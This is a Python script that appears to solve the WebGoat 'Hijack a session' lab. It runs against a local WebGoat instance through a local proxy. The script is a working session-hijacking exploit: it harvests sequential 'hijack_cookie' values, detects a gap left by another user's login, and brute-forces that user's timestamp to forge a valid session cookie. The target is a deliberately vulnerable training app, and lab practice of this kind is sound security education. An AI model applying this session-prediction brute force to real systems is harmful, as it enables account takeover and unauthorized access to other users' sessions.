#!/usr/bin/env python3
""" WebGoat Java - A1 Broken access control - Hijack a session """

import sys
import time
import requests

session = requests.session()
session.proxies = {"http": "http://localhost:8081"}

# From exercise POST in Burp
url = "http://localhost:8080/WebGoat/HijackSession/login"
headers = {"User-Agent": "Mozilla/5.0 (X11; Linux x86_64; rv:95.0) Gecko/20100101 Firefox/95.0", "Accept": "*/*", "Accept-Language": "en-US,en;q=0.5", "Accept-Encoding": "gzip, deflate", "Content-Type": "application/x-www-form-urlencoded; charset=UTF-8", "X-Requested-With": "XMLHttpRequest", "Origin": "http://localhost:8080", "Connection": "close", "Referer": "http://localhost:8080/WebGoat/start.mvc", "Sec-Fetch-Dest": "empty", "Sec-Fetch-Mode": "cors", "Sec-Fetch-Site": "same-origin"}
data = {"username": "test", "password": "test"}
cookies = {"JSESSIONID": "LiweJRqiw-44x_KSJPzWlVCCUQNcx_96U0gd2U2N"}
# "hijack_cookie": "2640497829383086225-1665866691608"

# Retrieve initial cookie and deconstruct
r = session.post(url, headers=headers, cookies=cookies, data=data)
hijack_cookie = r.cookies.get("hijack_cookie")
print(hijack_cookie)
s, t = hijack_cookie.split("-")
last_sequence = int(s)
last_timestamp = int(t)

# Brute sequence looking for a gap indicating a valid session
for i in range(1,101):
    r = session.post(url, headers=headers, cookies=cookies, data=data)
    hijack_cookie = r.cookies.get("hijack_cookie")
    print(hijack_cookie)
    s, t = hijack_cookie.split("-")
    sequence = int(s)
    timestamp = int(t)
    # Check for sequence gap
    if sequence != last_sequence + 1:
        print(f"Sequence gap found: {sequence} vs {last_sequence}")
        # Brute timestamp range for victim sequence
        for j in range(last_timestamp, timestamp):
            victim_sequence = last_sequence + 1
            my_cookies = {"hijack_cookie": f"{victim_sequence}-{j}"}
            session.cookies.update(my_cookies)
            r = session.post(url, headers=headers, cookies= cookies, data=data)
            # Check for success
            if '"lessonCompleted" : true' in r.text:
                print(r.text)
                sys.exit(0)  # Done!
    else:
        last_sequence = sequence
        last_timestamp = timestamp
    time.sleep(0.1)
